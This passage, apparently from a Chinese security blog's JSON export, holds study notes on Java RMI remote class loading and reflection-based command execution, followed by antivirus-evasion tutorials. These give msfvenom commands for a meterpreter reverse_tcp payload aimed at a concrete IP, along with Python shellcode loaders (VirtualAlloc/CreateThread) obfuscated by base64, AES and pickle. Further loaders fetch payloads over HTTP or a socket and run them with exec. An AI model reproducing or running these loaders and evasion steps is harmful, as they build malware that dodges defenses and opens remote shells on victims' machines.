Payload();\n\t\tli.add(3);\n\t\tli.add(4);\n\t\tSystem.out.println(r.sum(li));\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tnew RMIClient().lookup();\n\t&#125;\n&#125;\n\njavac RMIClient.java -classpath ../../../\n修改命令\njava  -Djava.rmi.server.useCodebaseOnly=false  -Djava.rmi.server.codebase=http://ip:port/RMIClient$Payload.class -Djava.security.policy=client.policy com.rmitest.CodeBaseClient.RMIClient\n这个codebase可以修改为自己服务器的IP:port\n当客户端运行时，服务端在classpath找不到/RMIClient$Payload.class 时，会尝试去远程加载codebase路径下的 /RMIClient$Payload.class\n这时只需要将恶意类放到服务器的 /RMIClient$Payload.class  就能执行恶意代码  \n需要注意的是，这个客户端不能放到服务端一起，需要在另一个地方运行，连接后才能让服务端找不到 /RMIClient$Payload.class      但是就是这样复现就有问题了\n问题：\n复现时执行服务端和客户端代码都报错：错误: 找不到或无法加载主类\n尝试用客户端连接，发现报错：no security manager: RMI class loader disabled\n再次尝试连接报错：Exception in thread “main” java.security.AccessControlException: access denied (“java.net.SocketPermission” “192.168.0.107:1099” “connect,resolve”)\n解决前面的问题后发现只能本地访问**/RMIClient$Payload.class,就算删除本地/RMIClient$Payload.class文件，设置了codebase远程连接他也不会远程访问获取，而是直接报错找不到该文件**\n\n解决：\n配置好classpath，尝试去除包名编译，可以运行服务端\n这个星球有人讲了，在客服端也需要设置SecurityManager\n这个解决方式是在客户端执行命令的时候也要在policy文件\n暂时没有解决\n\n","slug":"Java-RMI笔记","date":"2022-09-05T11:38:51.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"a87dfbaadf5431aac0df9631c18a8ee5","title":"Java反射笔记","content":"参考资料：\n廖雪峰老师Java教程   反射\nhttps://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512\np牛Java安全漫谈  反射篇1，2，3\nhttps://t.zsxq.com/056qbMzVV\nhttps://t.zsxq.com/05BiAyF6Y\nhttps://t.zsxq.com/05yrbEQVb\n常见的两种可以通过反射执行命令的类\njava.lang.Runtime\njava.lang.ProcessBuilder\n\n正常反射调用public方法   无参构造方法通过Method调用，能获取所有public方法，和父类中的方法\nimport java.lang.reflect.Method;\n\nClass clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);\n\nMethod execMethod &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);\n\nMethod getRuntimeMethod &#x3D; clazz.getMethod(&quot;getRuntime&quot;);\n\nObject runtime &#x3D; getRuntimeMethod.invoke(clazz);\n\nexecMethod.invoke(runtime, &quot;calc.exe&quot;);\n\n按照反射原理，正常创建类实例，之后通过类实例获取类方法，再通过获取到的类方法执行命令，通过invoke()进行执行。\n反射其实在编译时，就是正常的类的实例化和正常的方法调用\n通过反射调用ProcessBuilder执行命令    有参构造方法使用public ProcessBuilder(List command)这里使用Constructor进行反射调用，Constructor接收的参数为构造方法，通过Constructor可以实例化带参数的构造方法的类\nimport java.lang.reflect.Constructor;\n\nimport java.lang.reflect.Method;\n\nimport java.util.Arrays;\n\nimport java.util.List;\n\nClass clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);\n\n   \t\t&#x2F;&#x2F;强制转换类型调用\n\n    \t((ProcessBuilder)clazz.getConstructor(List.class).newInstance(\n\n    \t\t\tArrays.asList(&quot;calc.exe&quot;))).start();\n\n    \tclazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(\n\n   \t\t\tArrays.asList(&quot;calc.exe&quot;)));\n\npublic ProcessBuilder(String… command)这里调用该类中另一种构造方法进行类实例\n该构造方法采用可变长参数（varargs）  \nimport java.lang.reflect.Constructor;\n\nimport java.lang.reflect.Method;\n\nimport java.util.Arrays;\n\nimport java.util.List;\n\nClass clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);\n\n​    \t((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(\n\n​    \t\t\tnew String[][]&#123;&#123;&quot;cmd&quot;,&quot;calc.exe&quot;&#125;&#125;)).start();\n\n​    \tclazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(String[].class).newInstance(\n\n​    \tnew String[][] &#123;&#123;&quot;calc.exe&quot;&#125;&#125;));\n\n​    \t&#x2F;&#x2F;球友写的，完全反射，但是一样的问题\n\n​    \t&#x2F;&#x2F;Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);\n\n​    \t&#x2F;&#x2F;Constructor constructor &#x3D; clazz.getConstructor(String[].class);\n\n​    \t&#x2F;&#x2F;Object o &#x3D; constructor.newInstance(new String[][]&#123;&#123;&quot;calc.exe&quot;&#125;&#125;);\n\n​    \t&#x2F;&#x2F;clazz.getMethod(&quot;start&quot;).invoke(o);\n\n\n\n其中复现执行命令，发现 java.lang.ProcessBuilder 在进行\n public ProcessBuilder(String… command）   有错误，无法复现\n构造函数调用时，会爆出 \nException in thread “main” java.lang.IllegalArgumentException: argument type mismatch\n解决方法参考文章：https://blog.csdn.net/qq_21383435/article/details/108277906\n文章参考的是：https://www.cnblogs.com/huqingchen/p/5979936.html\n文中提到反射调用可变参数方法是，必须要保证输入参数的数组长度为1\n原文：//可变参数必须这样封装，因为java反射内部实现做了参数个数为1的判断，如果参数长度不为1，则会抛出异常\n所以要按照下面这么写\nString[] a &#x3D; &#123;&quot;calc.exe&quot;&#125;;\n\n​    \tObject[] b &#x3D; &#123;a&#125;;\n\n​    \tclazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(String[].class).newInstance(\n\n​    \t b));\n\n\n\n使用getDeclaredConstructor()反射调用私有的方法 getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了     \nimport java.lang.reflect.Constructor;\n\nimport java.lang.reflect.Method;\n\nimport java.util.Arrays;\n\nimport java.util.List;\n\n​    \tClass clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);\n\n​    \tConstructor m &#x3D; clazz.getDeclaredConstructor();\n\n​    \tm.setAccessible(true);\n\n​    \tclazz.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;calc.exe&quot;);\n\n这里又有问题，虽然设置了setAccessible为true，但是运行的时候还是报错，私有方法不可被调用\n在廖雪峰老师的教程中提到过虽然设置了setAccessible为true，但可能还是会有问题，就是不能访问\n原文：此外，setAccessible(true)可能会失败。如果JVM运行期存在SecurityManager，那么它会根据规则进行检查，有可能阻止setAccessible(true)。例如，某个SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，这样可以保证JVM核心库的安全。\n解决方法查看本机java版本是1.8- 3.2.1猜测可能是java版本过高\n去采用虚拟机里的1.8-2.x.x编译执行，成功执行命令\n测试本机命令行执行时发现，提示找不到主类\n再去除包名后重新编译，发现主机还是不能执行\n测试得出结论就是环境问题，同一个class文件，虚拟机能执行，主机不能执行\n","slug":"Java反射笔记","date":"2022-09-05T11:36:43.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"170904693726acf3c72f07df195a2a4e","title":"免杀入门-小迪笔记","content":"杀软检测方式在shellcode代码中包含了服务器的IP及监听端口，直接使用shellcode上线会被杀软检测到\n免杀常见初始思路加载方式修改各种shellcode加载方式达到免杀效果\n如常见加载器项目：Callback_Shellcode_Injection\nhttps://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=175.178.41.176 lport=6666 -f c\n但是使用过多已经完全被pass\n替换shellcode为自己的shellcode\n编码混淆加密算法利用常见的编码方式，如：Xor Aes Hex Rc4 Rsa等\n将shellcode编码，再到源文件加载前进行解码\nxor和aes加密metasploit的x86初始类型的shellcode使用该项目：https://github.com/Arno0x/ShellcodeWrapper\n生成raw类型shellcode文件\nmsfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=175.178.41.176 LPORT=6666 -f raw &gt; shellcode.raw\n脚本使用方式，本地安装requestments有问题\n加密库安装有问题，需要安装c++14.0 用vs studio安装\n使用python39 报错语法有问题，切换成py2可以加密成功\n工具下载最新的，防止bug\npython2 shellcode_encoder.py -cpp -cs -py shellcode.raw key xor\npython2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi xor\n-表示输出的文件类型，直接可编译，以上输出cpp，cs，py三种类型，cs是c#文件\nkey表示加密密钥\nxor表示加密方式\n\nencryptedShellcodeWrapper.cpp- 目前仅支持XOR 加密\nencryptedShellcodeWrapper.cs- 支持 XOR 和 AES 加密\nencryptedShellcodeWrapper.py- 支持 XOR 和 AES 加密\n\n生成的cpp文件打开后显示头文件错误，直接注释那一行\n之后将cpp文件生成exe\ncs编译  **C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319&gt;**csc /out:D:\\BaiduNetdiskDownload\\test\\test.exe D:\\BaiduNetdiskDownload\\test\\encryptedShellcodeWrapper_xor.cs\nmsf开启监听，测试脚本是否能上线\nexe执行报错，执行发现缺少dll文件，应该是x86的原因，测试一下其他的\n项目写的有问题，不用测试了，md，生成的文件编译后执行都有问题\n使用python3生成，但是python3生成时语法报错，真是个垃圾项目\n还有小迪自己编写的加密代码xor.py\npython xor.py -s shellcode.bin -d payload.c -n 10 -r out.bin\nhex加密使用shellcodelloader.exe生成exe文件\n生成payload，将生成的payload去掉   “  ,可能不能存在换行\n下载下来，使用工具生成exe，运行报错\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=175.178.41.176 lport=6666 -f c\nhttps://gchq.github.io/CyberChef/\nhttps://github.com/ByPassAVTeam/ShellcodeLoader\nLoaderMaker.exe download.dat(hex数据) xiaodi.exe(生成文件名)\nRc4加密msfvenom -p windows/meterpreter/reverse_tcp lhost=175.178.41.176 lport=6666 -f c\nhttps://blog.csdn.net/weixin_45590789/article/details/105536623\n使用方法，将rc4.cpp中的shellcode替换成msf生成的shellcode\n用vs调试，会生成加密后的shellcode，再将msf生成的shellcode替换为加密shellcode\n之后生成exe，可以将代码里的打印去掉，打印会导致弹窗打印\n前面也可以加上隐藏窗口代码\n","slug":"免杀入门-小迪笔记","date":"2022-09-05T11:23:50.000Z","categories_index":"python","tags_index":"免杀","author_index":"Longw"},{"id":"8d7177d71a9701596b230fd390060764","title":"python免杀-小迪笔记","content":"\n\npython免杀   小迪安全加载shellcode方式首先是shellcode两种常见的利用python的加载方式\n\n\n\nimport ctypes\n\nshellcode &#x3D; b&#39;&#39;\n\nrwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)\nctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\nctypes.windll.kernel32.WaitForSingleObject(handle, -1)\n\n\n\n\nimport ctypes\n\nshellcode &#x3D; b&#39;&#39;\n\nctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_int\n\nptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(bdata)), ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\nbuf &#x3D; (ctypes.c_char * len(bdata)).from_buffer(bdata)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(bdata)))\n\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))\n\n代码中每个函数的意思就不写了，想了解的看这篇：https://blog.csdn.net/solitudi/article/details/115283329\n讲讲小白入门的坑点吧！！！\n首先就是python的环境，刚开始在本机、虚拟机、win服务器都测试了一遍，都不能正常运行一直报错，后来才知道这个加载方式必须要使用python的32位版本，只有32位才能正常运行上面的代码。\npython是32位的，那payload当然也必须是32位的。\n然后就是ctypes这个库，在使用pip安装之后，你会发现还是加载不了，这个时候就需要去找到下载的库文件，修改ctypes这个文件夹的首字母为大写，之后才能正常的加载这个库。还是不行，就用pip安装ctypesdemo这个库，再修改ctypes文件夹首字母大写。\n解决上面的问题，你就能正常执行代码。上线cs和msf了。\n编码混淆直接加载shellcode，不用说，肯定被杀，所以要将shellcode进行编码或者加密达到混淆的效果，绕过杀软的检测\nbase64首先就是base64编码了，将shellcode进行base64编码，将编码的作为shellcode，在执行前进行解码\nimport ctypes\n\nshellcode &#x3D; b&#39;base64(shellcode)&#39;\n#base64.b64encode(shellcode)\nbase64.b64decode(shellcode)\n\nrwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)\nctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\nctypes.windll.kernel32.WaitForSingleObject(handle, -1)\n\naesbase64用的太多，在进行一层aes加密。使用base64编码的shellcode进行aes加密，用该加密shellcode作为代码中的shellcode，之后进行aes加密，再base64解码，在进行加载shellcode\nfrom Crypto.Cipher import AES\nimport ctypes\nimport base64\n\nBLOCK_SIZE &#x3D; 16  # Bytes\npad &#x3D; lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \\\n                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)\nunpad &#x3D; lambda s: s[:-ord(s[len(s) - 1:])]\n\ndef aesDecrypt(key, data):\n    &#39;&#39;&#39;\n\n    :param key: 密钥\n    :param data: 加密后的数据（密文）\n    :return:明文\n    &#39;&#39;&#39;\n    key &#x3D; key.encode(&#39;utf8&#39;)\n    data &#x3D; base64.b64decode(data)\n    cipher &#x3D; AES.new(key, AES.MODE_ECB)\n\n    # 去补位\n    text_decrypted &#x3D; unpad(cipher.decrypt(data))\n    text_decrypted &#x3D; text_decrypted.decode(&#39;utf8&#39;)\n    #print(text_decrypted)\n    return text_decrypted\n\naes1 &#x3D; &#39;&#39;&#39;加密后的shellcode&#39;&#39;&#39;\n\nkey &#x3D; &#39;5c44c819appsapi0&#39;\nshellcode &#x3D; aesDecrypt(key, aes1)\n\ndata&#x3D;base64.b64decode(shellcode)\n\nbdata &#x3D; bytearray(data)\nctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_int\nptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(bdata)), ctypes.c_int(0x3000),ctypes.c_int(0x40))\nbuf &#x3D; (ctypes.c_char * len(bdata)).from_buffer(bdata)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(bdata)))\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))\n\n这两种都是最常见的编码加密方式，还有xor，hex等。后面还可以尝试其他比较少见或者自己写个加密算法进行加密，可以达到很好的效果。\n序列化利用pickle库，将整个加载shellcode代码二进制化，在进行base64编码，将输出结果放到新的python文件里，使用pickle.loads()方式反序列化执行。\n\n序列化代码\n\nimport pickle\nimport base64\n\nshellcode &#x3D; &#39;&#39;&#39;\nimport ctypes,base64\nshellcode &#x3D; &quot;base64(shellcode)&quot;\ndata&#x3D;base64.b64decode(shellcode)\n#bdata &#x3D; bytearray(data)\nrwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(data), 0x1000, 0x40)\nctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(data), len(data))\nhandle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\nctypes.windll.kernel32.WaitForSingleObject(handle, -1)&#39;&#39;&#39;\n\n\nclass A(object):\n    def __reduce__(self):\n        return (exec, (shellcode,))\n\n\nret &#x3D; pickle.dumps(A())\nret_base64 &#x3D; base64.b64encode(ret)\nprint(ret_base64)\n\n\n反序列化执行\n\nimport base64,pickle,ctypes\nshellcode &#x3D; b&#39;序列化编码结果&#39;\npickle.loads(base64.b64decode(shellcode))\n\n这种方式看起来花里胡哨的，最后生成exe直接被火绒给杀了，测试时好像过了360上线一段时间也没有被杀，当然只是学习思路\n打包器使用不同打包器也会有不同的免杀效果\npyinstallerpython最常使用的就是pyinstaller，最方便但是几乎没有免杀效果\n安装：\npip install pyinstaller\n\n常用：\npyinstall -F xxx.py\n\n好处就是生成的exe不用携带dll文件之类的\npy2exe需要自建setup.py来进行打包，免杀效果有那么一点，会产生dll文件，不携带无法运行exe文件\n安装：\npip install py2exe\n\n打包：\npython setup.py py2exe\n\nsetup.py代码\nfrom distutils.core import setup\nimport py2exe\nINCLUDES &#x3D;[&#39;xxx&#39;]#注意修改脚本项目名\noptions &#x3D;&#123;\n&quot;py2exe&quot;:\n&#123;\n&quot;compressed&quot;:1,# 0或1,1压缩，0不压缩\n&quot;optimize&quot;:2,# 0、1、2，文件的优化级别\n&quot;bundle_files&quot;:1,# 1、2、3,1表示所有文件打包成一个exe文件，2表示除了Python的解释器外都绑定，3表示不绑定\n&quot;includes&quot;: INCLUDES,# 列表，包含其它的一些模块\n&quot;dll_excludes&quot;:[&#39;MSVCP90.dll&#39;]# 列表，包含的dll文件不会打包进exe程序\n&#125;\n&#125;\nsetup(\nversion&#x3D;&#39;1.0.0&#39;,\noptions&#x3D;options,\ndescription&#x3D;&quot;this is a xiaodi test&quot;,\nzipfile&#x3D;None,# 公用文件的压缩文件名称，默认为“library.zip”；如果没有，则会将这些文件放在最终的exe文件中\nconsole&#x3D;[&#123;&quot;script&quot;:&#39;xxx.py&#39;&#125;]# 生成一个控制台形式的exe程序，对应的有windows&#x3D;[]，生成GUI形式的exe程序\n)\n\n需要修改INCLUDES后面的内容位py文件名不带后缀，然后是下面的console，需要携带后缀名。\nNuitka免杀效果还行，就是会有一堆附属文件需要整个dict文件夹上传才能运行\n安装参考：https://zhuanlan.zhihu.com/p/133303836\n最常用使用方式：\nnuitka --mingw64 --standalone --show-memory --show-progress --nofollow-imports --follow-import-to&#x3D;utils,src --output-dir&#x3D;out xxx.py\n\n文件提取shellcode前面不管哪种方式，shellcode代码都是存在源py文件中，只是加密方式不同，文本提取则不同，shellcode本身并不会存在于源py文件，而是从外部获取。就是常说的无文件落地。\nreadfile最简单的就是从txt文件获取，小迪师傅演示三种，一种是读取shellcode，一种是读取shellcode和加载器，一种是读取混淆后的shellcode，替换混淆值为空\n直接来三种结合的，读取混淆的shellcode和加载器\n添加的混淆字符串还是使用xiaodi\nreadfile代码\nimport ctypes\nimport base64\n\n\ndef sc():\n    with open(&#39;s.txt&#39;, &#39;r&#39;) as f:\n        s &#x3D; f.read()\n    s &#x3D; s.replace(&#39;xiaodi&#39;, &#39;&#39;)\n    sc &#x3D; base64.b64decode(s)\n    return sc\n\ndef zx(s):\n    sc&#x3D;s\n    with open(&#39;z.txt&#39;, &#39;r&#39;) as f:\n        z &#x3D; f.read()\n    z &#x3D; z.replace(&#39;xiaodi&#39;, &#39;&#39;)\n    zx &#x3D; base64.b64decode(z)\n    exec(zx)\n\ns&#x3D;sc()\nz&#x3D;zx(s)\nprint(z)\n\ns.txt\n内容是base64编码并采用小迪字符串混淆的shellcode\n\nz.txt\n内容是base64编码并采用小迪字符串混淆的加载器代码\n\n免杀效果就不说了，比较只是学习思路\nargv参数获取前面采用文本获取，这里则是参数获取shellcode和加载器代码\n使用命令行输入加密shellcode和加密python加载器代码上线\npython test_argv.py base64shellcode base64加载器代码\nimport ctypes\nimport sys,base64\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    s&#x3D;sys.argv[1]\n    sc&#x3D;base64.b64decode(s)\n    z&#x3D;sys.argv[2]\n    zx&#x3D;base64.b64decode(z)\n    exec(zx)\n\nhttp远程加载将shellcode放到远程服务器的txt文件，用python开启http.serve服务，本地使用python的request请求加载\nimport ctypes,requests,base64\n\n\n\ndef g():\n    all&#x3D;requests.get(&#39;http:&#x2F;&#x2F;IP&#x2F;1.txt&#39;).text\n    return all\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    all&#x3D;base64.b64decode(g())\n    exec(all)\n\nsocket管道传输使用python开辟socket通道，上传服务端，本地使用客户端连接，通过客户端发送加载代码，服务端执行\n服务端\n# -*- coding:utf-8 -*-\n__author__ &#x3D; &#39;xiaodi&#39;\n\nimport kaisa\nimport socket,base64,ctypes,os\nserver&#x3D;socket.socket()\n\n\ndef zx(data):\n    sc&#x3D;base64.b64decode(data+b&#39;xxxxxxxxxxxxxxxxxxxxxx&#39;)\n    print(sc)\n    rwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x1000, 0x40)\n    ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(sc), len(sc))\n    handle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\n    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)\n    return sc\n\n\nserver &#x3D; socket.socket()\nserver.bind((&quot;0.0.0.0&quot;,9999))\nserver.listen(5)\nwhile True:\n    conn,addr &#x3D; server.accept()\n    print(&quot;new addr:&quot;,addr)\n    while True:\n        data &#x3D; conn.recv(1024)\n        if not data:\n            print(&quot;客户端已断开&quot;)\n            break\n        print(&quot;执行指令：&quot;,data)\n        zx(data)\n        if len(cmd_res) &#x3D;&#x3D; 0:\n            cmd_res &#x3D; &quot;cmd has no output....&quot;\n        conn.send( str(len(cmd_res.encode())).encode() )  #发送服务端发送给客户端数据的长度\n        conn.send(cmd_res.encode(&quot;utf-8&quot;))   #发送服务端的数据\n        print(&quot;send done&quot;)\nserver.close()\n\n客户端\nimport socket\n\nclient &#x3D; socket.socket()\nclient.connect((&quot;IP&quot;, 9999))\n\nwhile True:\n    cmd &#x3D; input(&quot;&gt;&gt;&gt;:&quot;).strip()\n    if len(cmd) &#x3D;&#x3D; 0: continue\n    client.send(cmd.encode(&quot;utf-8&quot;))\n    cmd_res_size &#x3D; client.recv(1024)  # 接收命令的长度\n    print(&quot;命令结果大小：&quot;, cmd_res_size.decode())\n    recevied_size &#x3D; 0  # 接收客户端发来数据的计算器\n    recevied_data &#x3D; b&#39;&#39;  # 客户端每次发来内容的计数器\n    while recevied_size &lt; int(cmd_res_size.decode()):  # 当接收的数据大小 小于 客户端发来的数据\n        cmd_res &#x3D; client.recv(1024)\n        recevied_size +&#x3D; len(cmd_res)  # 每次收到的服务端的数据有可能小于1024，所以必须用len判断\n        recevied_data +&#x3D; cmd_res\n    else:\n        print(recevied_data.decode(&quot;utf-8&quot;, &quot;ignore&quot;))\n        print(&quot;cmd res receive done ....&quot;, recevied_size)\n\nclient.close()\n\n注意：服务端的zx函数中的sc需要截取最后一写加密的shellcode代码，全部使用客户端发送加载会导致报错\n当然需要修改客户端的远程连接IP\n先运行服务端，在使用客户端连接，之后会让你输入，输入前面那段shellcode代码之后就会自动上线\n还有一种采用自己编写的加密方式的，参考：https://forum.butian.net/share/1794\n隐写入PNG图片使用pillow库写入PNG图片\n写入python文件\n#!&#x2F;usr&#x2F;bin&#x2F;env python3\n#coding&#x3D;utf-8\n\n&quot;&quot;&quot;Encode png image via command-line.\n\nUsage:\n    imageEncoding (-e|encode) &lt;originImage&gt; [&lt;text&gt;] [&lt;encodedImage&gt;]\n    imageEncoding (-d|decode) &lt;encodedImage&gt;\n\nOptions:\n    -h,--help   显示帮助菜单\n    -e          加密\n    -d          解密\n\nExample:\n    imageEncoding -e coffee.png hello textOrFileToEncode encodedImage.png\n    imageEncoding -d encodedImage.png\n&quot;&quot;&quot;\n\nfrom PIL import Image\nfrom docopt import docopt\n\n\n&quot;&quot;&quot;\n取得一个 PIL 图像并且更改所有值为偶数（使最低有效位为 0）\n&quot;&quot;&quot;\ndef RGBAmakeImageEven(image):\n    pixels &#x3D; list(image.getdata())  # 得到一个这样的列表： [(r,g,b,t),(r,g,b,t)...]\n    evenPixels &#x3D; [(r&gt;&gt;1&lt;&lt;1,g&gt;&gt;1&lt;&lt;1,b&gt;&gt;1&lt;&lt;1,t&gt;&gt;1&lt;&lt;1) for [r,g,b,t] in pixels]  # 更改所有值为偶数（魔法般的移位）\n    evenImage &#x3D; Image.new(image.mode, image.size)  # 创建一个相同大小的图片副本\n    evenImage.putdata(evenPixels)  # 把上面的像素放入到图片副本\n    return evenImage\n\ndef RGBmakeImageEven(image):\n    pixels &#x3D; list(image.getdata())  # 得到一个这样的列表： [(r,g,b,t),(r,g,b,t)...]\n    evenPixels &#x3D; [(r&gt;&gt;1&lt;&lt;1,g&gt;&gt;1&lt;&lt;1,b&gt;&gt;1&lt;&lt;1) for [r,g,b] in pixels]  # 更改所有值为偶数（魔法般的移位）\n    evenImage &#x3D; Image.new(image.mode, image.size)  # 创建一个相同大小的图片副本\n    evenImage.putdata(evenPixels)  # 把上面的像素放入到图片副本\n    return evenImage\n\n&quot;&quot;&quot;\n内置函数 bin() 的替代，返回固定长度的二进制字符串\n&quot;&quot;&quot;\ndef constLenBin(int):\n    binary &#x3D; &quot;0&quot;*(8-(len(bin(int))-2))+bin(int).replace(&#39;0b&#39;,&#39;&#39;)  # 去掉 bin() 返回的二进制字符串中的 &#39;0b&#39;，并在左边补足 &#39;0&#39; 直到字符串长度为 8\n    return binary\n\n&quot;&quot;&quot;\n将字符串编码到图片中\n&quot;&quot;&quot;\ndef RGBAencodeDataInImage(image, data):\n    evenImage &#x3D; RGBAmakeImageEven(image)  # 获得最低有效位为 0 的图片副本\n    binary &#x3D; &#39;&#39;.join(map(constLenBin,bytearray(data, &#39;utf-8&#39;))) # 将需要被隐藏的字符串转换成二进制字符串\n    if len(binary) &gt; len(image.getdata()) * 4:  # 如果不可能编码全部数据， 抛出异常\n        raise Exception(&quot;Error: Can&#39;t encode more than &quot; + len(evenImage.getdata()) * 4 + &quot; bits in this image. &quot;)\n    encodedPixels &#x3D; [(r+int(binary[index*4+0]),g+int(binary[index*4+1]),b+int(binary[index*4+2]),t+int(binary[index*4+3])) if index*4 &lt; len(binary) else (r,g,b,t) for index,(r,g,b,t) in enumerate(list(evenImage.getdata()))] # 将 binary 中的二进制字符串信息编码进像素里\n    encodedImage &#x3D; Image.new(evenImage.mode, evenImage.size)  # 创建新图片以存放编码后的像素\n    encodedImage.putdata(encodedPixels)  # 添加编码后的数据\n    return encodedImage\n\ndef RGBencodeDataInImage(image, data):\n    evenImage &#x3D; RGBmakeImageEven(image)  # 获得最低有效位为 0 的图片副本\n    binary &#x3D; &#39;&#39;.join(map(constLenBin,bytearray(data, &#39;utf-8&#39;))) # 将需要被隐藏的字符串转换成二进制字符串\n    if len(binary)%3 !&#x3D; 0:  # 将转换的比特流数据末位补零，使其长度为3的倍数，防止其在下面重新编码的过程中发生越界\n        rema &#x3D; len(binary)%3\n        binary &#x3D; binary+(&#39;0&#39;*(3-rema))\n#        print(len(binary))\n    if len(binary) &gt; len(image.getdata()) * 3:  # 如果不可能编码全部数据， 抛出异常\n        raise Exception(&quot;Error: Can&#39;t encode more than &quot; + len(evenImage.getdata()) * 3 + &quot; bits in this image. &quot;)\n    encodedPixels &#x3D; [(r+int(binary[index*3+0]),g+int(binary[index*3+1]),b+int(binary[index*3+2])) if index*3 &lt; len(binary) else (r,g,b) for index, (r,g,b) in enumerate(list(evenImage.getdata()))] # 将 binary 中的二进制字符串信息编码进像素里\n    encodedImage &#x3D; Image.new(evenImage.mode, evenImage.size)  # 创建新图片以存放编码后的像素\n    encodedImage.putdata(encodedPixels)  # 添加编码后的数据\n    return encodedImage\n\n&quot;&quot;&quot;\n从二进制字符串转为 UTF-8 字符串\n&quot;&quot;&quot;\ndef binaryToString(binary):\n    index &#x3D; 0\n    string &#x3D; []\n    rec &#x3D; lambda x, i: x[2:8] + (rec(x[8:], i-1) if i &gt; 1 else &#39;&#39;) if x else &#39;&#39;\n    # rec &#x3D; lambda x, i: x and (x[2:8] + (i &gt; 1 and rec(x[8:], i-1) or &#39;&#39;)) or &#39;&#39;\n    fun &#x3D; lambda x, i: x[i+1:8] + rec(x[8:], i-1)\n    while index + 1 &lt; len(binary):\n        chartype &#x3D; binary[index:].index(&#39;0&#39;) # 存放字符所占字节数，一个字节的字符会存为 0\n        length &#x3D; chartype*8 if chartype else 8\n        string.append(chr(int(fun(binary[index:index+length],chartype),2)))\n        index +&#x3D; length\n    return &#39;&#39;.join(string)\n\n&quot;&quot;&quot;\n解码隐藏数据\n&quot;&quot;&quot;\ndef RGBAdecodeImage(image):\n    pixels &#x3D; list(image.getdata())  # 获得像素列表\n    binary &#x3D; &#39;&#39;.join([str(int(r&gt;&gt;1&lt;&lt;1!&#x3D;r))+str(int(g&gt;&gt;1&lt;&lt;1!&#x3D;g))+str(int(b&gt;&gt;1&lt;&lt;1!&#x3D;b))+str(int(t&gt;&gt;1&lt;&lt;1!&#x3D;t)) for (r,g,b,t) in pixels]) # 提取图片中所有最低有效位中的数据\n    # 找到数据截止处的索引\n    locationDoubleNull &#x3D; binary.find(&#39;0000000000000000&#39;)\n    endIndex &#x3D; locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 !&#x3D; 0 else locationDoubleNull\n    data &#x3D; binaryToString(binary[0:endIndex])\n    return data\n\ndef RGBdecodeImage(image):\n    pixels &#x3D; list(image.getdata())  # 获得像素列表\n    binary &#x3D; 